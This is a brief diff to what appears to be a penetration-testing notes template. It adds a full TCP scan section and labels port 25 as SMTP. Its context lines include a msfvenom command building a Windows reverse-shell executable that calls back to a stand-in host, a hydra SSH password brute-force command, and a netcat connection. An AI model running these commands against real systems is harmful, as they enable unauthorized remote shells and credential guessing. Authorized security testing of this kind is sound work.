@@ -11,6 +11,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shel
 
 INSERTTCPSCAN
 
+### Full TCP Scan
+
+INSERTFULLTCPSCAN
+
 ### Vuln Scan
 
 INSERTVULNSCAN
@@ -72,7 +76,7 @@ hydra -I -t 5 -l username -P password ssh://INSERTIPADDRESS
 nc INSERTIPADDRESS 22
 ```
 
-### Port 25
+### Port 25 - SMTP
 
 - Name:
 - Version:
